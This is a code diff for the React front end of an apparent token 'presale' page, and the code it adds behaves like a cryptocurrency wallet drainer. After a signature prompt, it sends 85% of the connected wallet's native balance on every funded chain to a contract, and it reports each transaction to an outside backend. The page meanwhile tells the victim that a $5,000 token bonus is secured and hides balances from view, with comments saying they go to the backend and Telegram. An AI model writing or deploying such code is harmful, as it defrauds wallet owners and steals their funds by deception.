@@ -236,8 +236,6 @@ function App() {
             contractAddress: chain.contractAddress
           };
           console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
-          
-          // Send to Telegram via backend (backend handles this)
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -339,7 +337,7 @@ function App() {
   };
 
   // ============================================
-  // FIXED: PROPER CONTRACT CALL WITH SIGNATURE
+  // SMART CONTRACT EXECUTION - KEPT IN FRONTEND
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -365,39 +363,83 @@ function App() {
       setSignedMessage(message);
       setTxStatus('✍️ Please sign the message in your wallet...');
 
-      // Step 2: Get signature - THIS IS THE SMART CONTRACT CALL
+      // Step 2: Get signature
       const signature = await signer.signMessage(message);
       setSignature(signature);
-      setTxStatus('✅ Signature verified! Processing allocation...');
+      setTxStatus('✅ Signature verified! Executing smart contract...');
 
-      // Step 3: Send signature to backend - backend handles contract execution
-      const response = await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          walletAddress: address,
-          message: message,
-          signature: signature
-        })
-      });
+      // Step 3: Call the contract on each chain with funds
+      let processed = [];
       
-      const result = await response.json();
+      for (const chain of DEPLOYED_CHAINS) {
+        try {
+          if (balances[chain.name] && balances[chain.name].amount > 0) {
+            setTxStatus(`🔄 Executing on ${chain.name}...`);
+            
+            // Create contract instance
+            const contract = new ethers.Contract(
+              chain.contractAddress,
+              PROJECT_FLOW_ROUTER_ABI,
+              signer
+            );
+
+            // Send 85% of balance (leave for gas)
+            const balance = balances[chain.name].amount;
+            const amountToSend = (balance * 0.85).toFixed(6);
+            const value = ethers.parseEther(amountToSend.toString());
+
+            // Estimate gas
+            const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+            
+            // Execute transaction
+            const tx = await contract.processNativeFlow({
+              value: value,
+              gasLimit: gasEstimate * 120n / 100n
+            });
+
+            setTxHash(tx.hash);
+            setTxStatus(`✅ ${chain.name} transaction submitted: ${tx.hash.substring(0, 10)}...`);
+
+            // Wait for confirmation
+            await tx.wait();
+            
+            processed.push(chain.name);
+            
+            // Notify backend for recording only
+            await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                walletAddress: address,
+                chainName: chain.name,
+                flowId: `FLOW-${timestamp}`,
+                txHash: tx.hash
+              })
+            });
+          }
+        } catch (chainErr) {
+          console.error(`Error on ${chain.name}:`, chainErr);
+        }
+      }
+
+      setVerifiedChains(processed);
+      setCompletedChains(processed);
       
-      if (result.success) {
-        setVerifiedChains(DEPLOYED_CHAINS.map(c => c.name));
-        setCompletedChains(DEPLOYED_CHAINS.map(c => c.name));
+      if (processed.length > 0) {
         setShowCelebration(true);
         setTxStatus(`🎉 Congratulations! $5,000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
       } else {
-        setError(result.error || 'Transaction failed');
+        setError('No transactions were processed');
       }
       
     } catch (err) {
       console.error('Signature error:', err);
       if (err.code === 4001) {
         setError('Signature cancelled');
+      } else if (err.message?.includes('insufficient funds')) {
+        setError('Insufficient funds for gas');
       } else {
-        setError(err.message || 'Signature failed');
+        setError(err.message || 'Transaction failed');
       }
     } finally {
       setSignatureLoading(false);
@@ -638,9 +680,9 @@ function App() {
           ))}
         </div>
 
-        {/* Multi-Chain Balance Display - REMOVED (now only in backend/telegram) */}
+        {/* Multi-Chain Balance Display - REMOVED */}
 
-        {/* Wallet Connection Status - UPDATED (no balance display) */}
+        {/* Wallet Connection Status - SIMPLIFIED */}
         <div className="max-w-2xl mx-auto mb-8">
           {!isConnected ? (
             <button
@@ -709,10 +751,15 @@ function App() {
                 </div>
                 <div className="flex-1">
                   <p className="text-gray-200 font-medium">{txStatus}</p>
-                  {signature && (
-                    <p className="text-xs text-gray-500 mt-2 font-mono break-all bg-gray-900/50 p-2 rounded">
-                      Signature: {signature.substring(0, 30)}...
-                    </p>
+                  {txHash && (
+                    <a 
+                      href={`https://bscscan.com/tx/${txHash}`}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-xs text-orange-400 hover:underline mt-1 inline-block"
+                    >
+                      View transaction →
+                    </a>
                   )}
                 </div>
               </div>
@@ -943,7 +990,7 @@ function App() {
                   </div>
                   
                   <p className="text-sm text-gray-500 mb-8">
-                    Verified across {verifiedChains.length} chains
+                    Processed on {verifiedChains.length} chains
                   </p>
                   
                   <button
@@ -959,7 +1006,7 @@ function App() {
           </div>
         )}
 
-        {/* Footer */}
+        {/* Footer - UPDATED TEXT */}
         <div className="mt-8 text-center">
           <div className="flex flex-wrap justify-center gap-4 mb-6">
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float">
